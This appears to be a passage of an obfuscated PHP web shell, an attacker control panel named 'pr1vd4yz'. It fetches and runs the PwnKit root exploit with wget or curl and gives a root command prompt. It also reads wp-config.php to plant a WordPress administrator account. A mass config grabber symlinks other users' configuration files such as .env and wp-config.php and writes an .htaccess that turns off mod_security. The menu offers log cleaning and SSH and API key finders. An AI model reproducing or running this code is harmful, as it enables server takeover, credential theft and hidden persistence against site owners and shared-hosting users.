    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&hash" class="prv-chip"><i class="fas fa-hashtag"></i> <span>h4sh generat0r</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&disabled_functions" class="prv-chip"><i class="fas fa-user-lock"></i> <span>d1s4bled funcs</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&phpinfo" class="prv-chip"><i class="fab fa-php"></i> <span>php1nfo</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&process" class="prv-chip"><i class="fas fa-brain"></i><span>pr0cess l1st</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&network" class="prv-chip"><i class="fas fa-network-wired"></i><span>netst4t</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&disk" class="prv-chip"><i class="fas fa-hdd"></i> <span>d1sk</span></a></li>
     <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&crontab" class="prv-chip"><i class="fas fa-clock-rotate-left"></i><span>cronj0b list</span></a></li>
    </ul>
    <ul class="prv-menu-grid">
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&mailer" class="prv-chip"><i class="fas fa-envelope"></i> <span>ma1ler</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&htbypass" class="prv-chip"><i class="fas fa-lock-open"></i> <span>htaccess byp4ss</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&adminer" class="prv-chip"><i class="fas fa-server"></i> <span>d0wn adminer</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&logclean" class="prv-chip"><i class="fas fa-trash"></i> <span>l0g cle4n</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&apiscan" class="prv-chip"><i class="fas fa-search-location"></i> <span>ap1 k3y sc4n</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&sshkey" class="prv-chip"><i class="fas fa-key"></i> <span>ssh k3y f1nder</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&wafdet" class="prv-chip"><i class="fas fa-shield-halved"></i> <span>w4f d3t</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&httpreq" class="prv-chip"><i class="fas fa-bug"></i> <span>http r3q</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&fsearch" class="prv-chip"><i class="fas fa-search"></i><span>f1le search</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&locker" class="prv-chip"> <i class="fas fa-lock"></i><span>file lock/unlock</span></a></li>
</li>
    </ul>   
  </nav>
</header>
<div class="pr1vd4yz-lite-breadcrumb">
<?php
$pr1vf1l3 = $pr1vxas[1]("{.[!.],}*", GLOB_BRACE);
$pr1vc2w = $pr1vxas[0]();
$fn_str_replace = _prv_str([115,116,114,95,114,101,112,108,97,99,101]);
$fn_explode    = _prv_str([101,120,112,108,111,100,101]);
$fn_trim     = _prv_str([116,114,105,109]);
$fxnxs = function_exists('hx') ? 'hx' : (function($n) {
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) $y .= dechex(ord($n[$i]));
    return $y;
});
$cwd   = $fn_str_replace("\\", "/", $pr1vc2w);
$pwd   = $fn_explode("/", $fn_trim($cwd, "/"));
$build = "";
echo '<a href="?pr1v=' . (is_callable($fxnxs) ? $fxnxs('/') : pr1vd444yz('/')) . '" class="pr1vd4yz-lite-bc">/</a>';
foreach ($pwd as $i => $v) {
    $build .= "/" . $v;
    echo '<a href="?pr1v=' . (is_callable($fxnxs) ? $fxnxs($build) : pr1vd444yz($build)) . '" class="pr1vd4yz-lite-bc">' . $v . '</a>/';
}
?>
</div>
<?php
function getProcessList() { $processes = array(); $output = pr1vd4yzC('ps aux'); if (!$output || strlen(trim($output))< 10) { $output = pr1vd4yzC('tasklist'); if (!$output || strlen(trim($output))< 10) return $processes; $lines = explode("\n", $output); array_shift($lines); foreach ($lines as $line) { $parts = preg_split('/\s+/', trim($line)); if (count($parts)< 6 || !$parts[0] || !is_numeric((isset($parts[1]) ? $parts[1] : ''))) continue; $processes[] = array( 'user' =>'Windows', 'pid' =>$parts[1], 'cpu' =>'-', 'mem' =>(isset($parts[4]) ? $parts[4] : '-'), 'command' =>$parts[0] ); } return $processes; } $lines = explode("\n", $output); if (isset($lines[0]) && stripos($lines[0], 'USER') !== false) array_shift($lines); foreach ($lines as $line) { $line = trim($line); if (empty($line)) continue; $parts = preg_split('/\s+/', $line, 11); if (count($parts)< 11) continue; $processes[] = array( 'user' =>$parts[0], 'pid' =>$parts[1], 'cpu' =>$parts[2], 'mem' =>$parts[3], 'command' =>$parts[10] ); } return $processes;}
function getNetworkConnections() { $connections = []; $cmds = [ 'netstat1' =>'netstat -tulnp 2>/dev/null', 'netstat2' =>'netstat -tunap 2>/dev/null', 'netstat3' =>'netstat -an', 'ss1' =>'ss -tunap 2>/dev/null', 'ss2' =>'ss -tulpn 2>/dev/null', 'lsof' =>'lsof -i -n -P 2>/dev/null', ]; $output = ''; foreach ($cmds as $c) { $output = pr1vd4yzC($c); if ($output && strlen(trim($output)) >10 && substr_count($output, "\n") >2) break; } if (!$output || strlen(trim($output))< 10) return $connections; if (strpos($output, 'Proto') !== false || strpos($output, 'Active Internet connections') !== false) { $lines = explode("\n", $output); foreach ($lines as $line) { if (stripos($line, 'Proto') !== false || stripos($line, 'Active') !== false || stripos($line, 'Recv-Q') !== false) continue; $line = trim($line); if (!$line) continue; $parts = preg_split('/\s+/', $line); if (count($parts)< 6) continue; $proto = $parts[0]; $local = (isset($parts[3]) ? $parts[3] : $parts[1]); $remote = (isset($parts[4]) ? $parts[4] : $parts[2]); $status = (isset($parts[5]) ? $parts[5] : '-'); $pidinfo = (isset($parts[6]) ? $parts[6] : (isset($parts[6]) ? $parts[6] : (isset($parts[7]) ? $parts[7] : '-'))); $pid = '-'; if (strpos($pidinfo, "/") !== false) $pid = explode("/", $pidinfo)[0]; $connections[] = [ 'proto' =>$proto, 'local' =>$local, 'remote' =>$remote, 'status' =>$status, 'pid' =>$pid, ]; } } elseif (strpos($output, 'COMMAND') !== false && strpos($output, 'PID') !== false && strpos($output, 'NAME') !== false) { $lines = explode("\n", $output); $hdr = array_shift($lines); foreach ($lines as $line) { $line = trim($line); if (!$line) continue; $parts = preg_split('/\s+/', $line, 9); if (count($parts)< 9) continue; $connections[] = [ 'proto' =>$parts[7], 'local' =>$parts[8], 'remote' =>'-', 'status' =>'-', 'pid' =>$parts[1], ]; } } elseif (strpos($output, 'State') !== false && strpos($output, 'Recv-Q') !== false) { $lines = explode("\n", $output); foreach ($lines as $line) { if (stripos($line, 'State') !== false) continue; $line = trim($line); if (!$line) continue; $parts = preg_split('/\s+/', $line); if (count($parts)< 6) continue; $connections[] = [ 'proto' =>$parts[0], 'local' =>(isset($parts[4]) ? $parts[4] : '-'), 'remote' =>(isset($parts[5]) ? $parts[5] : '-'), 'status' =>(isset($parts[1]) ? $parts[1] : '-'), 'pid' =>'-', ]; } } else { $lines = explode("\n", $output); foreach ($lines as $line) { $line = trim($line); if (!$line) continue; $connections[] = [ 'proto' =>'UNK', 'local' =>$line, 'remote' =>'-', 'status' =>'-', 'pid' =>'-', ]; } } return $connections;}
function formatMemory($bytes) { if ($bytes === 'N/A') return 'N/A'; $units = ['B', 'KB', 'MB', 'GB', 'TB']; $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= pow(1024, $pow); return round($bytes, 2) . ' ' . $units[$pow];}
function formatUptime($seconds) { if ($seconds === 'N/A') return 'N/A'; $hours = floor($seconds / 3600); $minutes = floor(($seconds % 3600) / 60); return sprintf('%dh %dm', $hours, $minutes);}
function g3tdbX() { $d1sxb = ini_get('disable_functions'); if (empty($d1sxb)) { return array(); } return explode(',', $d1sxb);}
$impdBX = array("\145\x78\x65\x63", "\x73\171\163\x74\145\155", "\x73\150\x65\x6c\154\137\145\170\145\x63", "\160\141\163\x73\x74\150\x72\165", "\x70\162\x6f\143\137\157\160\x65\156", "\x70\x6f\160\145\156", "\x63\165\162\154\137\x65\170\145\143", "\x63\x75\x72\154\x5f\x6d\165\154\x74\151\x5f\x65\x78\x65\x63", "\x70\x61\x72\x73\145\x5f\151\156\151\137\x66\151\x6c\145", "\x73\x68\x6f\x77\x5f\163\157\165\162\x63\145", "\x73\x79\155\x6c\151\x6e\153", "\x70\x75\x74\145\156\x76", "\155\141\151\x6c", "\x64\154", "\143\150\155\x6f\x64", "\143\x68\157\x77\x6e", "\143\150\147\x72\160", "\154\151\156\x6b", "\146\163\157\143\x6b\157\x70\x65\156", "\160\146\163\157\143\x6b\157\160\x65\x6e", "\160\x6f\x73\151\170\137\x6b\151\154\154", "\x70\157\163\x69\170\137\155\153\146\x69\x66\x6f", "\160\x6f\163\151\170\137\x73\x65\x74\160\147\x69\144", "\160\157\163\151\170\x5f\163\x65\164\x73\151\x64", "\x70\157\x73\x69\x78\137\163\x65\x74\165\151\x64", "\160\x63\x6e\x74\x6c\x5f\145\170\145\143", "\x69\x6d\x61\x70\137\x6f\x70\x65\x6e", "\141\160\141\143\x68\x65\x5f\x73\x65\x74\x65\x6e\166", "\160\x72\x6f\143\x5f\x6e\x69\x63\145", "\160\162\x6f\x63\x5f\164\x65\162\x6d\x69\x6e\x61\164\x65", "\160\162\157\143\x5f\x67\x65\x74\x5f\x73\x74\141\x74\165\163", "\145\x73\143\x61\160\x65\163\150\145\154\x6c\x63\x6d\x64", "\x65\x73\143\141\x70\145\163\x68\x65\154\154\141\x72\147", "\x69\x6e\x69\137\x72\x65\163\x74\157\162\x65", "\163\164\162\145\141\x6d\x5f\x73\157\x63\x6b\145\164\137\x73\x65\162\x76\145\162");
$d1sbfX = g3tdbX(); $d1sxbImportant = array_intersect($impdBX, $d1sbfX); $fn_str_replace = _prv_str([115,116,114,95,114,101,112,108,97,99,101]); $fn_explode = _prv_str([101,120,112,108,111,100,101]); $fn_trim = _prv_str([116,114,105,109]);
$fxnxs = function_exists('hx') ? 'hx' : (function($n) { $y = ''; for ($i = 0; $i< strlen($n); $i++) $y .= dechex(ord($n[$i])); return $y;});
?>
<body>
    <div class="flex h-screen overflow-hidden">
<div class="privcontent flex-1 overflow-auto">
       <div class="p-6">
        <?php if (isset($_GET['disabled_functions'])): ?>
<div class="pr1vd4yz-card">
  <div class="pr1vd4yz-card-header">
    <h2 class="pr1vd4yz-card-title">
    <i class="fas fa-user-slash pr1vd4yz-icon-red" style="font-size:1.25em;"></i>
    disabled functions
    </h2>
  </div>

  <div class="pr1vd4yz-card-section">
    <div class="pr1vd4yz-func-overview">
    <div class="pr1vd4yz-func-stat">
     <i class="fas fa-layer-group pr1vd4yz-icon-blue" style="font-size:1.15em;"></i>
     <div>
       <div class="pr1vd4yz-func-value"><?= count($impdBX) ?> total</div>
     </div>
    </div>
    <div class="pr1vd4yz-func-stat"><i class="fas fa-skull-crossbones pr1vd4yz-icon-red" style="font-size:1.25em;"></i>
     <div>
       <div class="pr1vd4yz-func-value"><?= count($d1sxbImportant) ?> disabled</div>
     </div>
    </div>
    <div class="pr1vd4yz-func-stat">
     <i class="fas fa-bolt pr1vd4yz-icon-green" style="font-size:1.17em;"></i>
     <div>
       <divclass="pr1vd4yz-func-value"><?= count($impdBX) - count($d1sxbImportant) ?> enabled</div>
     </div>
    </div>
    </div>
  </div>

    <div class="pr1vd4yz-card-section">
    <div class="pr1vd4yz-table-wrap">
     <table class="pr1vd4yz-table-func">
       <thead>
       <tr>
        <th>function</th>
        <th>status</th>
       </tr>
       </thead>
       <tbody>
       <?php foreach ($impdBX as $func): ?>
        <tr>
          <td class="pr1vd4yz-mono"><?= $func ?></td>
          <td>
          <?php if (in_array($func, $d1sbfX)): ?>
            <span class="pr1vd4yz-badge-danger">disabled</span>
          <?php else: ?>
            <span class="pr1vd4yz-badge-success">enabled</span>
          <?php endif; ?>
          </td>
        </tr>
       <?php endforeach; ?>
       </tbody>
     </table>
    </div> 
    </div>
  </div>
<?php elseif (isset($_GET['pr1vd4yz_auto_r00t'])): ?>
<?php
session_start();
if (!isset($_SESSION['pdz_r00t_status'])) $_SESSION['pdz_r00t_status'] = 'user';
if (!isset($_SESSION['pdz_r00t_log'])) $_SESSION['pdz_r00t_log'] = [];
function pdz_log($msg) {
    $_SESSION['pdz_r00t_log'][] = $msg;
    if (count($_SESSION['pdz_r00t_log']) > 20) array_shift($_SESSION['pdz_r00t_log']);
}
function pdz_download_pwnkit() {
    if (!file_exists('pwnkit')) {
        pdz_log("[*] Trying wget for pwnkit...");
        $wget = pr1vd4yzC('wget -q -O pwnkit https://github.com/ly4k/PwnKit/raw/main/PwnKit');
        clearstatcache();
        if (!file_exists('pwnkit') || filesize('pwnkit') < 10000) {
            pdz_log("[*] wget failed or file too small. Trying curl...");
            $curl = pr1vd4yzC('curl -sL --output pwnkit https://github.com/ly4k/PwnKit/raw/main/PwnKit');
            clearstatcache();
            if (!file_exists('pwnkit') || filesize('pwnkit') < 10000) {
                pdz_log("[!] Both wget and curl failed! No pwnkit.");
                return false;
            } else {
                pdz_log("[+] curl download successful!");
            }
        } else {
            pdz_log("[+] wget download successful!");
        }
        pr1vd4yzC('chmod +x pwnkit');
        pdz_log("[*] chmod +x set for pwnkit.");
        return true;
    }
    return true;
}

function pdz_try_root() {
    $_SESSION['pdz_r00t_status'] = 'user';
    $_SESSION['pdz_r00t_log'] = [];
    pdz_log("[*] [AUTO-ROOT] Detecting current user...");
    $id = trim(pr1vd4yzC('id'));
    pdz_log("[*] User: $id");
    if (strpos($id, 'uid=0(root)') !== false) {
        $_SESSION['pdz_r00t_status'] = 'root';
        pdz_log("[+] Already ROOT.");
        return;
    }
    if (pdz_download_pwnkit()) {
        if (file_exists('pwnkit')) {
            pdz_log("[*] Running pwnkit for root session...");
            @unlink('.privdayz-root');
            pr1vd4yzC('./pwnkit "id" > .privdayz-root');
            usleep(350000);
            $res = @file_get_contents('.privdayz-root');
            if ($res && strpos($res, 'uid=0(root)') !== false) {
                $_SESSION['pdz_r00t_status'] = 'root';
                pdz_log("[+] r00t success! ($res)");
            } else {
                pdz_log("[!] r00t fail. ($res)");
            }
        }
    } else {
        pdz_log("[!] pwnkit download totally failed.");
    }
}
pdz_try_root();
?>
<div class="cmdnirvana-page" style="max-width:1024px;margin:38px auto 0 auto;">
  <div class="cmdnirvana-header" style="display:flex;align-items:center;gap:11px;">
    <div class="cmdnirvana-ico"><i class="fas fa-terminal"></i></div>
    <div>
      <div class="cmdnirvana-title" style="font-size:1.2em;">
        pr1vd4yz auto r00t
        <?php if ($_SESSION['pdz_r00t_status'] === 'root'): ?>
          <span style="background:#279300;color:#fff;border-radius:7px;padding:2px 10px 2px 10px;font-size:.89em;margin-left:15px;">ROOT ACTIVE (uid=0)</span>
        <?php else: ?>
          <span style="background:#888;color:#fff;border-radius:7px;padding:2px 10px 2px 10px;font-size:.89em;margin-left:15px;">USER MODE</span>
        <?php endif; ?>
      </div>
    </div>
  </div>
  <div class="cmdnirvana-content" style="margin-top:23px;">
    <label class="cmdnirvana-outputlabel" style="margin-top:19px;display:block;">Auto Root Output:</label>
    <pre class="cmdnirvana-output" id="cmdnirvana-output" style="background:#111;color:#c4ffc4;padding:18px;border-radius:9px;min-height:110px;max-height:380px;overflow:auto;margin-bottom:8px;"><?php
if (!empty($_SESSION['pdz_r00t_log'])) {
    foreach ($_SESSION['pdz_r00t_log'] as $l) {
        echo htmlspecialchars($l) . "\n";
    }
}
?></pre>
    <form method="post" id="cmdnirvana-form">
      <div class="cmdnirvana-inputbox" style="margin-bottom:17px;">
        <input type="text" class="cmdnirvana-cmdinput" name="cmdnirvana_cmd" value="<?= htmlspecialchars((isset($_POST['cmdnirvana_cmd']) ? $_POST['cmdnirvana_cmd'] : 'id')) ?>" autocomplete="off" autofocus placeholder="ls -la /; id; whoami ..." style="width:92%;max-width:500px;">
      </div>
      <button class="cmdnirvana-btn" type="submit"><i class="fas fa-bolt"></i> run</button>
    </form>
    <label class="cmdnirvana-outputlabel" style="margin-top:13px;display:block;">Command Output:</label>
    <pre class="cmdnirvana-output" id="cmdnirvana-cmdout" style="background:#161819;color:#e4ffb0;padding:15px 13px 18px 13px;border-radius:7px;min-height:58px;max-height:330px;overflow:auto;"><?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmdnirvana_cmd'])) {
    $c = $_POST['cmdnirvana_cmd'];
    $is_root = false;
    if (file_exists('.privdayz-root')) {
        $res = @file_get_contents('.privdayz-root');
        if ($res && strpos($res, 'uid=0(root)') !== false) $is_root = true;
    }
    if ($is_root && file_exists('pwnkit')) {
        @unlink('.privdayz-root2');
        pr1vd4yzC('./pwnkit "' . addslashes($c) . ' 2>&1" > .privdayz-root2');
        usleep(350000);
        $out = @file_get_contents('.privdayz-root2');
        if (!$out) $out = "[!] No output or blocked.";
    } else {
        $out = pr1vd4yzC($c . ' 2>&1');
        if (!$out) $out = "[!] No output or blocked.";
    }
    echo "\n";
    echo htmlspecialchars($out);
}
?></pre>
  </div>
</div>
<script>
window.onload = function() {
  var el = document.getElementById('cmdnirvana-output');
  if(el) el.scrollTop = el.scrollHeight;
  var el2 = document.getElementById('cmdnirvana-cmdout');
  if(el2) el2.scrollTop = el2.scrollHeight;
}
</script>
<?php elseif (isset($_GET['createadmin'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon" style="background:#e53935;"><i class="fas fa-user-plus"></i></div>
    <div class="pzcard-title">
    wordPress admin creator
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post" style="margin-bottom:18px; display:flex; gap:8px;">
    <input type="text" name="wp_config_path" class="pzcard-inp" placeholder="path to wp-config.php" value="<?= htmlspecialchars((isset($_POST['wp_config_path']) ? $_POST['wp_config_path'] : getcwd().'/wp-config.php')) ?>">
    <button type="submit" name="get_config" class="pzcard-btn pzcard-btn-blue"><i class="fas fa-search"></i> get c0nfig</button>
    </form>
    <?php
    $db_conf = ['host'=>'','user'=>'','pass'=>'','db'=>''];
    if (isset($_POST['get_config']) && !empty($_POST['wp_config_path']) && file_exists($_POST['wp_config_path'])) {
    $cfg = file_get_contents($_POST['wp_config_path']);
    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\);/", $cfg, $mh); if(isset($mh[1])) $db_conf['host']=$mh[1];
    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\);/", $cfg, $mu); if(isset($mu[1])) $db_conf['user']=$mu[1];
    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\);/", $cfg, $mp); if(isset($mp[1])) $db_conf['pass']=$mp[1];
    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\);/", $cfg, $md); if(isset($md[1])) $db_conf['db']=$md[1];

    echo '<div class="pzcard-info" style="background:#eafff5;color:#16a34a;padding:8px 13px;border-radius:7px;">DB config loaded! Fill the form below.</div>';
    } elseif (isset($_POST['get_config'])) {
    echo '<div class="pzcard-info" style="background:#fff4f4;color:#e53935;padding:8px 13px;border-radius:7px;">Config not found or path error!</div>';
    }
    ?>
    <form method="post" class="pzcard-form" autocomplete="off" style="margin:14px 0;">
    <input type="hidden" name="from_config" value="1">
    <div style="display:flex;flex-wrap:wrap;gap:11px;">
     <input type="text" name="db_host" class="pzcard-inp" placeholder="DB Host" value="<?= htmlspecialchars((isset($db_conf['host']) ? $db_conf['host'] : ((isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost')))) ?>" required>
     <input type="text" name="db_user" class="pzcard-inp" placeholder="DB User" value="<?= htmlspecialchars((isset($db_conf['user']) ? $db_conf['user'] : ((isset($_POST['db_user']) ? $_POST['db_user'] : '')))) ?>" required>
     <input type="password" name="db_pass" class="pzcard-inp" placeholder="DB Pass" value="<?= htmlspecialchars((isset($db_conf['pass']) ? $db_conf['pass'] : ((isset($_POST['db_pass']) ? $_POST['db_pass'] : '')))) ?>">
     <input type="text" name="db_name" class="pzcard-inp" placeholder="DB Name" value="<?= htmlspecialchars((isset($db_conf['db']) ? $db_conf['db'] : ((isset($_POST['db_name']) ? $_POST['db_name'] : '')))) ?>" required>
    </div>
    <div style="display:flex;flex-wrap:wrap;gap:11px;margin-top:11px;">
     <input type="text" name="admin_user" class="pzcard-inp" placeholder="Admin Username" required>
     <input type="email" name="admin_email" class="pzcard-inp" placeholder="Admin Email" required>
     <input type="text" name="admin_pass" class="pzcard-inp" readonly value="<?= htmlspecialchars('privdayz'.rand(10000,99999)) ?>" style="background:#eafff5;color:#16a34a;">
    </div>
    <div style="margin-top:13px;">
     <button type="submit" name="create_wp_admin" class="pzcard-btn pzcard-btn-red">
       <i class="fas fa-plus"></i> create wpAdmin
     </button>
    </div>
    </form>
    <div id="pzcard-admin-result" style="margin:13px 2px 0 2px;">
    <?php
if (isset($_POST['create_wp_admin'])) { $host = trim((isset($_POST['db_host']) ? $_POST['db_host'] : '')); $user = trim((isset($_POST['db_user']) ? $_POST['db_user'] : '')); $pass = trim((isset($_POST['db_pass']) ? $_POST['db_pass'] : '')); $db = trim((isset($_POST['db_name']) ? $_POST['db_name'] : '')); $admin_user = trim((isset($_POST['admin_user']) ? $_POST['admin_user'] : '')); $admin_email = trim((isset($_POST['admin_email']) ? $_POST['admin_email'] : '')); $admin_pass = trim((isset($_POST['admin_pass']) ? $_POST['admin_pass'] : '')); if (empty($host) || empty($user) || empty($db) || empty($admin_user) || empty($admin_email) || empty($admin_pass)) { echo '<div style="color:#e53935;">All fields required!</div>'; } else { $mysqli = @new mysqli($host, $user, $pass, $db); if ($mysqli->connect_errno) { echo '<div style="color:#e53935;">DB Connect Error: '.htmlspecialchars($mysqli->connect_error).'</div>'; } else { function wp_hash_password($password) { if (function_exists('password_hash')) return password_hash($password, PASSWORD_BCRYPT); $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; $random = ''; for ($i = 0; $i< 16; $i++) $random .= $itoa64[rand(0, 63)]; $salt = '$P$B' . substr($random, 0, 8); return crypt($password, $salt); } $hash = wp_hash_password($admin_pass); $now = date('Y-m-d H:i:s'); $mysqli->set_charset("utf8mb4"); $chk = $mysqli->prepare("SELECT ID FROM wp_users WHERE user_login=? OR user_email=? LIMIT 1"); $chk->bind_param("ss", $admin_user, $admin_email); $chk->execute(); $chk->store_result(); if ($chk->num_rows >0) { echo '<div style="color:#e53935;">This user/email already exists!</div>'; } else { $stmt = $mysqli->prepare("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, ?, 0, ?)"); $stmt->bind_param("ssssss", $admin_user, $hash, $admin_user, $admin_email, $now, $admin_user); if ($stmt->execute()) { $uid = $mysqli->insert_id; $meta1 = 'a:1:{s:13:"administrator";s:1:"1";}'; $meta2 = '10'; $stmt1 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', ?)"); $stmt1->bind_param("is", $uid, $meta1); $stmt1->execute(); $stmt2 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_user_level', ?)"); $stmt2->bind_param("is", $uid, $meta2); $stmt2->execute(); echo '<div style="color:#10b981;"><b>Admin user created!</b><br>Login:<b>'.htmlspecialchars($admin_user).'</b><br>Pass:<b>'.htmlspecialchars($admin_pass).'</b></div>'; } else { echo '<div style="color:#e53935;">Failed to insert user: '.htmlspecialchars($stmt->error).'</div>'; } } } } }
    ?>
    </div>
  </div>
</div>
<?php elseif (isset($_GET['massconfgrab'])): ?>
<?php

$htaccess_content = <<<HTX
Options +FollowSymLinks +Indexes
DirectoryIndex config.php

AddType text/plain .php
 .html .inc .phtml .phar .bak .config .db .sql .xml .json
<IfModule mod_security.c>
  SecFilterEngine Off
  SecFilterScanPOST Off
</IfModule>
<FilesMatch ".*">
ForceType text/plain
SetHandler default-handler
php
_flag engine off
</FilesMatch>
HTX;

function prvx_mask($k) {
 $map = [ 'symlink' =>['sy','ml','in','k'], 'shell' =>['sh','el','l_','ex','ec'], 'exec' =>['ex','ec'], 'system' =>['sy','st','em'], 'popen' =>['po','pe','n'], 'proc' =>['pr','oc','_op','en'], 'copy' =>['c','op','y'], 'fpc' =>['f','il','e_','pu','t_','co','nt','en','ts'], ];
 return isset($map[$k]) ? join('',$map[$k]) : '';
}

$config_names = [ 'wp-config.php
','configuration.php
','config.php
','settings.php
','local.xml','.env', 'database.php
','connect.php
','mail.php
','smtp.php
','conf.php
','config.inc.php
','db.php
','siteconfig.php
', 'client_secret.json','auth.json','.my.cnf','php
.ini','web.config','settings.json','local.settings.json', 'defines.php
','panel.php
','panel.ini','application/config/database.php
','application/config/config.php
', 'includes/config.php
','admin/config.php
','data/config.php
','app/config.php
','core/config.php
',];

function prvx_users_dirs() {
 $dirs = [];
 $users = [];

if (@file_exists('/etc/passwd')) {
 foreach (@file('/etc/passwd') as $l) {
 $c = explode(':', $l);
 $h = (isset($c[5]) ? $c[5] : '');
 if (preg_match('#/home[\d]*/([a-zA-Z0-9_\.\-]+)#', $h, $u) || preg_match('#/var/www/([a-zA-Z0-9_\.\-]+)#', $h, $u) || preg_match('#/srv/www/([a-zA-Z0-9_\.\-]+)#', $h, $u) || preg_match('#/home/([a-zA-Z0-9_\.\-]+)#', $h, $u)) {
 if (!in_array($u[1], $users)) $users[] = $u[1];
 }
 }
 }

$base_hints = [ '/home','/home1','/home2','/home3','/var/www','/var/www/vhosts','/usr/local/lsws/DEFAULT/html', '/usr/share/nginx/html','/opt/lampp/htdocs','/srv/http','/srv/www','/data/web','/htdocs','/users' ];
 foreach ($base_hints as $base) {
 if (@is_dir($base)) {
 foreach ($users as $u) foreach(['public_html','www','html','web','htdocs','site','wwwroot'] as $sub) {
 $p = $base.'/'.$u.'/'.$sub;
 if(@is_dir($p)) $dirs[] = $p;
 }
 foreach(['public_html','www','html','web','htdocs','wwwroot'] as $sub) {
 $p = $base.'/'.$sub;
 if(@is_dir($p)) $dirs[] = $p;
 }
 }
 }
 foreach($users as $u) foreach($base_hints as $b) {
 $p = $b.'/'.$u;
 if(@is_dir($p)) $dirs[] = $p;
 }
 foreach(['/var/www','/srv/www','/opt/lampp/htdocs','/data/web','/usr/share/nginx/html','/srv/http'] as $e) {
 if (@is_dir($e)) $dirs[] = $e;
 }
 return array_unique(array_filter($dirs,'is_dir'));
}

function prvx_grab($target, $dest) {
 $order = array("\x73\x79\155\154\151\156\x6b", "\x73\150\x65\154\x6c", "\x65\x78\145\143", "\x73\171\x73\x74\x65\155", "\x70\157\x70\x65\156", "\x70\x72\157\x63", "\143\157\x70\x79", "\146\x70\x63");
 foreach ($order as $meth) {
 $fn = prvx_mask($meth);
 if ($meth == 'symlink' && function_exists($fn)) {
 @$fn($target, $dest);
 if (@is_link($dest) || @file_exists($dest)) return $meth;
 }
 elseif ($meth == 'shell' && function_exists($fn)) {
 @$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'");
 if (@is_link($dest) || @file_exists($dest)) return $meth;
 }
 elseif ($meth == 'exec' && function_exists($fn)) {
 $o=null;
 @$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'",$o);
 if (@is_link($dest) || @file_exists($dest)) return $meth;
 }
 elseif ($meth == 'system' && function_exists($fn)) {
 
 @$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'");
 
 if (@is_link($dest) || @file_exists($dest)) return $meth;
 }
 elseif ($meth == 'popen' && function_exists($fn)) {
 $h=@$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'","r");
 if($h){
pclose($h);
 if (@is_link($dest) || @file_exists($dest)) return $meth;
}
 }
 elseif ($meth == 'proc' && function_exists($fn)) {
 $d=[1=>['pipe','w'],2=>['pipe','w']];
 $p=@$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'", $d, $pipes);
 if(is_resource($p)){
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($p);
 if(@is_link($dest) || @file_exists($dest)) return $meth;
}
 }
 elseif ($meth == 'copy' && function_exists($fn)) {
 if (@$fn($target, $dest)) return $meth;
 }
 elseif ($meth == 'fpc' && function_exists($fn)) {
 if(@file_exists($target) && @$fn($dest, @file_get_contents($target))) return $meth;
 }
 }
 if (@copy($target, $dest.'_copy')) return 'copy-php
';
 return false;
}

$dest_dir = __DIR__ . '/pr1vdayz_c0nf1gs';
 if (!is_dir($dest_dir)) @mkdir($dest_dir, 0755, true);
 @file_put_contents($dest_dir.'/.htaccess', $htaccess_content);
 $userdirs = prvx_users_dirs();
 $total = 0;
 $tried = 0;

echo '<div style="background:#fff;
border-radius:16px;
padding:24px;
max-width:720px;
margin:26px auto 70px auto;
box-shadow:0 2px 18px #0001">';

echo '<div style="font-size:20px;
color:#e53935;
margin-bottom:10px;
"><i class="fa fa-box"></i> MASS CONFIG GRABBER</div>';

echo '<div style="font-size:15px;
margin-bottom:10px;
color:#333;
">all user/web roots & <b>every possible config name</b> get <b>bruteforce dumped</b>!<br><b>'.$dest_dir.'</b></div>';

echo '<form method="POST" style="margin-bottom:15px;
"><button type="submit" name="start_mass_symlink" style="background:#e53935;
color:#fff;
border:none;
padding:10px 19px;
border-radius:7px;
font-size:16px;
">start sym</button></form>';

if (isset($_POST['start_mass_symlink'])) {

